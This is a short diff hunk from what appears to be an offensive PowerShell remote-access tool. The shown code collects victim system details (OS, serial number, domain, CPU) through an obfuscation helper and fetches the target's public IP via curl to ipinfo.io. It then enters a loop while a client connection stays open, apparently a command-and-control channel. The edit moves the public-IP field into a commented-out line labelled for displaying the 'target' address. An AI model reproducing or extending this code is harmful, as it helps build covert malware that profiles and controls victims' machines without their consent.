@@ -368,7 +368,9 @@ $syst_dir = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).SystemD
 $Processor = Character_Obfuscation("(Get-WmiObject Win32_processor).Caption");
 $PublicIP = ("(curl http://ipinfo.io/ip).content");
 
-$Command = "`"`n   Host          : `"+`"$Remote_Host`"+`"``n   System        : `"+$System+`"``n   Version       : `"+$Version+`"``n   Architecture  : `"+$Architecture+`"``n   DomainName    : `"+$Name+`"``n   WindowsDir    : `"+$WindowsDirectory+`"``n   SystemDir     : `"+$syst_dir+`"``n   SerialNumber  : `"+$serial+`"``n   ProcessorCPU  : `"+$Processor+`"``n   Public IP     : `"+$PublicIP";
+$Command = "`"`n   Host          : `"+`"$Remote_Host`"+`"``n   System        : `"+$System+`"``n   Version       : `"+$Version+`"``n   Architecture  : `"+$Architecture+`"``n   DomainName    : `"+$Name+`"``n   WindowsDir    : `"+$WindowsDirectory+`"``n   SystemDir     : `"+$syst_dir+`"``n   SerialNumber  : `"+$serial+`"``n   ProcessorCPU  : `"+$Processor";
+## UN_COMMENT THE NEXT LINE TO DISPLAY TARGET PUBLIC IP ADDRESS
+#$Command = "`"`n   Host          : `"+`"$Remote_Host`"+`"``n   System        : `"+$System+`"``n   Version       : `"+$Version+`"``n   Architecture  : `"+$Architecture+`"``n   DomainName    : `"+$Name+`"``n   WindowsDir    : `"+$WindowsDirectory+`"``n   SystemDir     : `"+$syst_dir+`"``n   SerialNumber  : `"+$serial+`"``n   ProcessorCPU  : `"+$Processor+`"``n   Public IP     : `"+$PublicIP";
 
 
 While($Client.Connected)
